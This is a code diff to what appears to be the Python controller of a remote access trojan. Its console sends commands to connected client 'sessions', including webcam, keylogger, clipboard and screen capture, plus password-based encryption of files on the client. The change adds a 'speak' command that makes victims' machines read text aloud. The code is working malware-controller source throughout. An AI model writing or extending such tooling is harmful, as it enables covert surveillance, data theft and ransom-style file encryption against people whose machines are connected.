@@ -7,13 +7,13 @@ import argparse
 import math
 import os
 # non-standard libraries
+import texttable
+import cmd2
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.exceptions import InvalidTag
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-import texttable
-import cmd2
 
 
 class Server:
@@ -121,6 +121,18 @@ class Server:
         request = {"cmd": "s",
                    "monitor": monitor,
                    "save_path": path_to_save,
+                   "timeout": self.user_interface.cmd_timeout}
+        for connection in connections:
+            self.connection.send(request, connection)
+            valid, response = self.connection.recv(connection, {"error": str})
+            if valid:
+                if response["error"]:
+                    self.user_interface.perror(
+                        f"Error from session {self.connection.get_index_by_connection(connection)}: {response['error']}")
+
+    def speak(self, msg, connections):
+        request = {"cmd": "l",
+                   "msg": msg,
                    "timeout": self.user_interface.cmd_timeout}
         for connection in connections:
             self.connection.send(request, connection)
@@ -421,7 +433,7 @@ class UserInterface(cmd2.Cmd):
 
     clip_parser = argparse.ArgumentParser(prog="clip")
     clip_parser.add_argument("-c", "--content", default="", type=str,
-                                 help="content to store to clipboard if provided")
+                             help="content to store to clipboard if provided")
     clip_parser.add_argument("-s", "--sessions", required=True, nargs="+", help="sessions indices or groups")
 
     block_parser = argparse.ArgumentParser(prog="block")
@@ -435,6 +447,10 @@ class UserInterface(cmd2.Cmd):
     crypt_parser.add_argument("-r", "--read", required=True, type=str, help="file or folder to read")
     crypt_parser.add_argument("-p", "--pwd", required=True, type=str, help="password to use")
     crypt_parser.add_argument("-s", "--sessions", required=True, nargs="+", help="sessions indices or groups")
+
+    speak_parser = argparse.ArgumentParser(prog="speak")
+    speak_parser.add_argument("-m", "--message", default="", type=str, help="message to read out")
+    speak_parser.add_argument("-s", "--sessions", required=True, nargs="+", help="sessions indices or groups")
 
     def __init__(self, server):
         super().__init__()
@@ -550,6 +566,11 @@ class UserInterface(cmd2.Cmd):
         """En/decrypt a file or directory with password"""
         self.server.crypt(args.action, args.read, args.pwd, self.server.connection.get_conn_fgoi(args.sessions))
 
+    @cmd2.decorators.with_argparser(speak_parser)
+    def do_speak(self, args):
+        """Read a given text out loud"""
+        self.server.speak(args.message, self.server.connection.get_conn_fgoi(args.sessions))
+
     # categorize the functions
     cmd2.categorize((do_list,
                      do_exit,
@@ -570,7 +591,8 @@ class UserInterface(cmd2.Cmd):
                      do_cam,
                      do_logger,
                      do_clip,
-                     do_crypt), "Executed on the client")
+                     do_crypt,
+                     do_speak), "Executed on the client")
 
 
 if __name__ == "__main__":
